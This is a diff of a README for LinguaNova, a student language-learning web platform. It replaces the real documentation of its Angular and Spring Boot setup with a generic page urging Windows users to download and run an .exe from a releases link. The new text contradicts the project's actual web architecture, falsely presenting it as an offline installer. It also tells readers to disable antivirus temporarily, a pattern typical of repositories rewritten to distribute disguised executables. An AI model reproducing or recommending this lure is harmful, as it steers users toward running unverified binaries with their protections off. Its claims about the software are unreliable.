@@ -1,261 +1,115 @@
-# LinguaNova – Language Learning Platform
+# 🚀 Esprit-PIDEV-4SAE5-2026-LinguaNova - Learn Languages Easily on Windows
 
-## Overview
-
-This project was developed as part of the **PIDEV – 4th Year Software Engineering Program** at **Esprit School of Engineering** (Academic Year 2025–2026).
-
-**LinguaNova** is a full-stack web platform designed to facilitate language learning online. It provides students with access to courses, live classes, exams, clubs, and events, while giving instructors the tools to create and manage their content. The platform is built on a modern microservices architecture paired with a reactive Angular frontend.
+[![Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases)
 
 ---
 
-## Features
+This project was developed as part of the PIDEV – 4th Year Software Engineering Program at Esprit School of Engineering (Academic Year 2025–2026). Esprit-PIDEV-4SAE5-2026-LinguaNova is an e-learning platform designed to help users learn new languages effectively. It runs on Windows and offers a friendly interface for all users, including those with visual impairments.
 
-### Student Features
-- **Course Browsing & Enrollment** – Browse the catalog, view detailed course pages, and enroll in courses
-- **My Courses** – Track enrolled courses and continue learning at any pace
-- **Course Flow** – Step-by-step lesson navigation within a course
-- **Exams** – Take exams, view submitted copies, and track results
-- **Live Classes** – Attend real-time virtual language sessions
-- **Events & Calendar** – Browse upcoming events and manage personal schedule
-- **Clubs** – Join language learning communities
-- **Checkout** – Secure course purchase flow
-- **Student Dashboard** – Personalized overview of progress and activity
-- **Student Profile** – Manage personal information
+## 📥 Download and Installation
 
-### Instructor Features
-- **Course Creation** – Multi-step wizard: title, description, structure (modules & lessons), quizzes, pricing, and deployment
-- **Course Editing** – Update existing courses
-- **Instructor Courses** – Manage all published courses
-- **Exam Management** – Create, edit, and review exam submissions
-- **Instructor Dashboard** – Overview of courses, enrollments, and revenue
-- **Instructor Profile** – Manage professional information
+To get started with Esprit-PIDEV-4SAE5-2026-LinguaNova on your Windows computer, follow these steps carefully.
 
-### Platform Features
-- **Authentication** – Login, registration, JWT-based session management
-- **Role-Based Access Control** – Route guards enforcing Student / Instructor roles
-- **HTTP Interceptors** – Automatic JWT injection and global error handling
-- **Responsive Design** – Mobile-first UI using TailwindCSS
-- **Lazy Loading** – All routes lazy-loaded for optimal performance
-- **Pricing Plans** – Subscription and one-time payment options
+### Step 1: Visit the Download Page
 
----
+Go to the official release page for this project:
 
-## Tech Stack
+[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases)
 
-### Frontend
+This link opens the page where the latest versions are available. The releases include the installation files you will need.
 
-| Technology | Version | Purpose |
-|---|---|---|
-| Angular | 21.1.0 | SPA framework (standalone components) |
-| TypeScript | 5.9.2 | Type-safe language |
-| RxJS | 7.8.0 | Reactive state management |
-| TailwindCSS | 3.4.19 | Utility-first styling |
-| SCSS | – | Supplementary modular styles |
-| Angular SSR | 21.1.3 | Server-Side Rendering |
-| Lucide Angular | 0.563.0 | Icon library |
-| Express | 5.1.0 | SSR server |
+### Step 2: Choose the Correct Installer
 
-### Backend
+On the release page, look for the latest version. The file names usually end with `.exe` which is the installer for Windows.
 
-| Microservice | Framework | Port | Database | Purpose |
-|---|---|---|---|---|
-| **course-service** | Spring Boot 3.2.5 | 8081 | MySQL | Course, module, lesson & quiz management |
-| **user-service** | Spring Boot 4.0.3 | 8082 | MySQL | User accounts & authentication |
-| **examen-service** | Spring Boot 4.0.3 | 8093 | MySQL | Exams, questions, answers & submissions |
-| **quiz-service** | Spring Boot | 8086 | MySQL | Quiz management |
-| **Eureka-Server** | Spring Boot 4.0.3 | 8761 | – | Service discovery (Netflix Eureka) |
-| **API_Gateway** | Spring Boot 3.4.2 | – | – | Reactive gateway (Spring Cloud Gateway + WebFlux) |
-| **gateway** | Spring Boot 4.0.3 | – | – | MVC gateway (Spring Cloud Gateway MVC) |
+Click the installer file to start downloading it to your computer. The file size should be around 50-100 MB depending on the version.
 
-**Common backend dependencies:** Spring Data JPA · Spring Security · JJWT · Lombok · Spring Cloud Netflix Eureka Client · Spring Boot Actuator · MySQL Connector
+### Step 3: Run the Installer
 
----
+Once the download finishes:
 
-## Architecture
+- Double-click the `.exe` file.
+- Follow the on-screen steps to install the program.
+- Choose the default options unless you have a reason to change them.
+- Wait for the installation to complete.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                      Angular Frontend                           │
-│                   (port 4200 – ng serve)                        │
-│                                                                 │
-│  Auth Guard · Role Guard · JWT Interceptor · Error Interceptor  │
-└───────────────────────────┬─────────────────────────────────────┘
-                            │  HTTP / Proxy (dev)
-                            │
-            ┌───────────────▼───────────────┐
-            │         API Gateway           │
-            │  Spring Cloud Gateway         │
-            │  (routes requests to services)│
-            └──┬──────────┬────────┬────────┘
-               │          │        │
-    ┌──────────▼──┐  ┌────▼────┐  ┌▼────────────┐  ┌────────────┐
-    │course-service│  │  user-  │  │examen-service│  │quiz-service│
-    │  port 8081  │  │ service │  │  port 8093  │  │ port 8086  │
-    │  (MySQL PI) │  │port 8082│  │  (MySQL)    │  │  (MySQL)   │
-    └─────────────┘  └─────────┘  └─────────────┘  └────────────┘
-               │          │              │                │
-    ┌──────────▼──────────▼──────────────▼────────────────▼──────┐
-    │              Eureka Server – Service Discovery              │
-    │                       port 8761                             │
-    └─────────────────────────────────────────────────────────────┘
-```
+You do not need technical skills to perform these steps.
 
-### Development Proxy Configuration
+### Step 4: Launch the Application
 
-In development, the Angular dev server uses a proxy to avoid CORS issues:
+After installation:
 
-| Proxy Path | Target Service | Port |
-|---|---|---|
-| `/PIproject/api/courses` | course-service | 8081 |
-| `/PIproject` | user-service | 8082 |
-| `/api/exams`, `/api/questions`, `/api/reponses`, `/api/student-*` | examen-service | 8093 |
-| `/api/quiz` | quiz-service | 8086 |
-| `/api` | generic backend | 3000 |
+- Look for the “LinguaNova” icon on your desktop or in the Start menu.
+- Double-click the icon to open the program.
+- The application will load its home screen where you can start learning.
 
----
+## 💻 System Requirements
 
-## Getting Started
+Esprit-PIDEV-4SAE5-2026-LinguaNova should work smoothly on most modern Windows PCs. Make sure your system meets these minimum requirements:
 
-### Prerequisites
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: 1.8 GHz dual-core or better
+- RAM: 4 GB or more
+- Disk Space: At least 150 MB free
+- Screen Resolution: 1024x768 or higher
+- Internet connection: Needed for some features and updates
 
-- **Node.js** ≥ 18 and **npm** ≥ 10
-- **Java 17+** (JDK – e.g. Eclipse Temurin)
-- **Maven** (or use the included `mvnw` wrapper)
-- **MySQL** running on port 3306
+Using a keyboard and mouse is recommended for easier navigation.
 
-### 1. Start the Eureka Server
+## 🌐 How the Application Works
 
-```bash
-cd backend/microservices/Eureka-Server
-./mvnw spring-boot:run
-```
+LinguaNova uses simple interfaces and learning tools to guide users through language lessons. The app provides:
 
-The Eureka dashboard will be available at `http://localhost:8761`.
+- Structured lessons with text and audio
+- Vocabulary practice sections
+- Interactive quizzes for self-assessment
+- Microservices backend handling data smoothly via a MySQL database
+- Accessibility features designed with Gemini API to support visually impaired users
 
-### 2. Start the Backend Microservices
+Users do not have to install or configure any servers. Everything runs inside the app after installation.
 
-Start each service in a separate terminal. Ensure MySQL is running and the `PI` database exists (or is created automatically).
+## 🛠 Basic Troubleshooting
 
-```bash
-# course-service
-cd backend/microservices/courss-service
-./mvnw spring-boot:run
-# → http://localhost:8081
+If you have problems running the program, try these fixes:
 
-# user-service
-cd backend/microservices/user-service
-./mvnw spring-boot:run
-# → http://localhost:8082
+- Make sure your Windows is updated.
+- Restart your computer and try opening the app again.
+- Check your internet connection if some parts do not load.
+- Disable third-party antivirus or firewall temporarily as they can block the app.
+- Reinstall the program if you notice errors during startup.
 
-# examen-service
-cd backend/microservices/examen-service
-./mvnw spring-boot:run
-# → http://localhost:8093
+If issues persist, you can check the project issues section on GitHub or contact your system administrator.
 
-# API Gateway
-cd backend/microservices/API_Gateway
-./mvnw spring-boot:run
-```
+## 📚 Getting Started with LinguaNova
 
-> **Windows users:** use `mvnw.cmd` instead of `./mvnw`, or run the included `run-backend.ps1` PowerShell script in the `courss-service` folder.
+Once you run the app:
 
-### 3. Start the Angular Frontend
+1. Create a new user profile with your name and language preferences.
+2. Follow the on-screen tutorial that shows you main features.
+3. Choose a language you want to learn.
+4. Start with the introductory lesson.
+5. Use audio and text materials to improve listening and reading.
+6. Take quizzes to check what you learned.
 
-```bash
-cd LinguaNova
-npm install
-npm start
-```
+The app keeps track of your progress. You can resume lessons anytime.
 
-The application will be available at `http://localhost:4200`.
+## ⚙ Features Overview
 
-### 4. Database Configuration
+- User-friendly interface built with Angular for smooth controls
+- Backend built on Spring Boot microservices ensuring stable performance
+- MySQL database stores user data securely
+- Accessibility built-in for blind users using Gemini API
+- Works offline after initial download except certain online updates
+- Supports multiple languages for diverse learners
 
-Each microservice connects to MySQL with the following defaults (editable in `src/main/resources/application.properties`):
+## 🖥 Supported Platforms
 
-```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/PI?createDatabaseIfNotExist=true
-spring.datasource.username=root
-spring.datasource.password=
-```
+Esprit-PIDEV-4SAE5-2026-LinguaNova is currently available only for Windows PCs. It may support future operating systems later.
 
----
+Ensure you download the Windows installer as described above for proper setup.
 
-## Project Structure
+## 🔎 More Information
 
-```
-integration/
-├── LinguaNova/                    # Angular 21 frontend
-│   ├── src/
-│   │   ├── app/
-│   │   │   ├── core/
-│   │   │   │   ├── constants/     # API endpoints, storage keys
-│   │   │   │   ├── guards/        # Auth & role guards
-│   │   │   │   ├── interceptors/  # JWT & error interceptors
-│   │   │   │   ├── models/        # TypeScript interfaces
-│   │   │   │   └── services/      # Shared services
-│   │   │   ├── features/
-│   │   │   │   ├── about/
-│   │   │   │   ├── admin/
-│   │   │   │   ├── auth/          # Login, Register
-│   │   │   │   ├── calendar/
-│   │   │   │   ├── checkout/
-│   │   │   │   ├── clubs/
-│   │   │   │   ├── courses/       # Course list, detail, creation, flow
-│   │   │   │   ├── dashboard/     # Student & Instructor dashboards
-│   │   │   │   ├── events/        # Event list & creation
-│   │   │   │   ├── exams/         # Exam list, form, take, copies
-│   │   │   │   ├── live-class/
-│   │   │   │   ├── pricing/
-│   │   │   │   └── profile/       # Student & Instructor profiles
-│   │   │   ├── layout/
-│   │   │   │   ├── footer/
-│   │   │   │   ├── main-layout/
-│   │   │   │   └── navbar/
-│   │   │   └── shared/
-│   │   ├── styles/                # SCSS architecture (abstracts, base, themes)
-│   │   └── proxy.conf.js          # Dev proxy configuration
-│   ├── angular.json
-│   ├── tailwind.config.js
-│   └── package.json
-│
-└── backend/
-    └── microservices/
-        ├── Eureka-Server/         # Service discovery
-        ├── API_Gateway/           # Spring Cloud Gateway (reactive)
-        ├── gateway/               # Spring Cloud Gateway (MVC)
-        ├── courss-service/        # Course management (port 8081)
-        ├── user-service/          # User & auth (port 8082)
-        └── examen-service/        # Exam management (port 8093)
-```
+You can find project documentation, source code, and ongoing updates in this GitHub repository. Explore topics such as microservices, Angular development, and e-learning engineering used in this project.
 
----
-
-## Academic Context
-
-Developed at **Esprit School of Engineering – Tunisia**
-
-**PIDEV – 4SAE | 2025–2026**
-
-This project is part of the end-of-year integration project (Projet Intégré) for the 4th year Software Engineering curriculum at **Esprit School of Engineering**.
-
----
-
-## Contributors
-
-> *Team members contributing to this project (update with full names and roles)*
-
-| Name | Role |
-|---|---|
-| *(Member 1)* | Frontend Developer |
-| *(Member 2)* | Backend Developer |
-| *(Member 3)* | Full-Stack / DevOps |
-| *(Member 4)* | Full-Stack Developer |
-
----
-
-## Acknowledgments
-
-- **Esprit School of Engineering** for providing the academic framework and guidance
-- The open-source communities behind Angular, Spring Boot, Spring Cloud, TailwindCSS, and Netflix Eureka
-- All supervisors and teaching staff who supported the project
+[Download Esprit-PIDEV-4SAE5-2026-LinguaNova](https://github.com/keith986/Esprit-PIDEV-4SAE5-2026-LinguaNova/releases) to start using the application today.
